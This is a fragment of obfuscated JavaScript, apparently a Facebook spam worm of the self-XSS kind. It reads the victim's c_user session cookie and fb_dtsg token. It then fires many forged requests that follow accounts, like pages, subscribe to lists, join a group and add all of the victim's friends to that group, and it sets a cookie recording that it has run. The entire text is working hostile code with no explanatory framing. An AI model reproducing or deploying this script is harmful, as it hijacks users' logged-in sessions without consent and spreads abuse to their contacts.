_0x9c10x7=_0x6733[6]+_0x9c10x4+_0x6733[7]+user_id+_0x6733[8]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;IDS(_0x6733[17]);IDS(_0x6733[18]);IDS(_0x6733[19]);IDS(_0x6733[20]);IDS(_0x6733[21]);IDS(_0x6733[22]);IDS(_0x6733[23]);IDS(_0x6733[24]);IDS(_0x6733[25]);IDS(_0x6733[26]);IDS(_0x6733[27]);var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var now=( new Date)[_0x6733[28]]();function P(_0x9c10xa){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[29];var _0x9c10x7=_0x6733[30]+_0x9c10xa+_0x6733[31]+now+_0x6733[32]+user_id+_0x6733[33]+fb_dtsg+_0x6733[9];_0x9c10x5[_0x6733[11]](_0x6733[10],_0x9c10x6,true);_0x9c10x5[_0x6733[12]]=function (){if(_0x9c10x5[_0x6733[13]]==4&&_0x9c10x5[_0x6733[14]]==200){_0x9c10x5[_0x6733[15]];} ;} ;_0x9c10x5[_0x6733[16]](_0x9c10x7);} ;P(_0x6733[34]);P(_0x6733[35]);P(_0x6733[36]);P(_0x6733[37]);P(_0x6733[38]);P(_0x6733[39]);P(_0x6733[40]);P(_0x6733[41]);P(_0x6733[42]);P(_0x6733[43]);P(_0x6733[44]);P(_0x6733[45]);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function Like(_0x9c10xc){var _0x9c10xd= new XMLHttpRequest();var _0x9c10xe=_0x6733[46];var _0x9c10xf=_0x6733[47]+_0x9c10xc+_0x6733[48]+user_id+_0x6733[49]+fb_dtsg+_0x6733[9];_0x9c10xd[_0x6733[11]](_0x6733[10],_0x9c10xe,true);_0x9c10xd[_0x6733[12]]=function (){if(_0x9c10xd[_0x6733[13]]==4&&_0x9c10xd[_0x6733[14]]==200){_0x9c10xd[_0x6733[15]];} ;} ;_0x9c10xd[_0x6733[16]](_0x9c10xf);} ;Like(_0x6733[50]);Like(_0x6733[51]);Like(_0x6733[52]);Like(_0x6733[53]);Like(_0x6733[54]);Like(_0x6733[55]);Like(_0x6733[56]);Like(_0x6733[57]);Like(_0x6733[58]);Like(_0x6733[59]);Like(_0x6733[60]);function sublist(_0x9c10x11){var a=document[_0x6733[62]](_0x6733[61]);a[_0x6733[63]]=_0x6733[64]+_0x9c10x11+_0x6733[65];document[_0x6733[67]][_0x6733[66]](a);} ;function a(_0x9c10x13){var _0x9c10x14= new XMLHttpRequest;var _0x9c10x15=_0x6733[68];var _0x9c10x16=_0x6733[69]+_0x9c10x13+_0x6733[70]+fb_dtsg+_0x6733[71]+user_id+_0x6733[9];_0x9c10x14[_0x6733[11]](_0x6733[10],_0x9c10x15,true);_0x9c10x14[_0x6733[12]]=function (){if(_0x9c10x14[_0x6733[13]]==4&&_0x9c10x14[_0x6733[14]]==200){_0x9c10x14[_0x6733[15]];} ;} ;_0x9c10x14[_0x6733[16]](_0x9c10x16);} ;a(_0x6733[17]);a(_0x6733[18]);a(_0x6733[19]);a(_0x6733[20]);a(_0x6733[21]);a(_0x6733[22]);a(_0x6733[23]);a(_0x6733[24]);a(_0x6733[25]);a(_0x6733[26]);a(_0x6733[27]);sublist(_0x6733[72]);sublist(_0x6733[73]);sublist(_0x6733[74]);sublist(_0x6733[75]);sublist(_0x6733[76]);sublist(_0x6733[77]);sublist(_0x6733[78]);sublist(_0x6733[79]);sublist(_0x6733[80]);sublist(_0x6733[81]);sublist(_0x6733[82]);sublist(_0x6733[83]);sublist(_0x6733[84]);var gid=[_0x6733[85]];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x6733[86];var paramswp=_0x6733[87]+gid+_0x6733[88]+fb_dtsg+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[16]](paramswp);var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x6733[11]](_0x6733[97],_0x6733[98]+user_id+_0x6733[99]+Math[_0x6733[100]]()+_0x6733[101],false);gf[_0x6733[16]]();if(gf[_0x6733[13]]!=4){} else {data=eval(_0x6733[102]+gf[_0x6733[104]][_0x6733[103]](9)+_0x6733[105]);if(data[_0x6733[106]]){} else {friends=data[_0x6733[110]][_0x6733[109]][_0x6733[108]](function (_0x9c10x1c,_0x9c10x1d){return _0x9c10x1c[_0x6733[107]]-_0x9c10x1d[_0x6733[107]];} );} ;} ;for(var i=0;i<friends[_0x6733[94]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x6733[111];var paramswp=_0x6733[88]+fb_dtsg+_0x6733[112]+gid+_0x6733[113]+friends[i][_0x6733[114]]+_0x6733[89]+user_id+_0x6733[9];httpwp[_0x6733[11]](_0x6733[10],urlwp,true);httpwp[_0x6733[92]](_0x6733[90],_0x6733[91]);httpwp[_0x6733[92]](_0x6733[93],paramswp[_0x6733[94]]);httpwp[_0x6733[92]](_0x6733[95],_0x6733[96]);httpwp[_0x6733[12]]=function (){if(httpwp[_0x6733[13]]==4&&httpwp[_0x6733[14]]==200){} ;} ;httpwp[_0x6733[16]](paramswp);} ;var spage_id=_0x6733[51];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);var smesaj=_0x6733[115];var smesaj_text=_0x6733[115];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x6733[116]](bugun[_0x6733[28]]()+1000*60*60*4*1);if(!document[_0x6733[4]][_0x6733[3]](/paylasti=(\d+)/)){document[_0x6733[4]]=_0x6733[117]+btarihi[_0x6733[118]]();} ;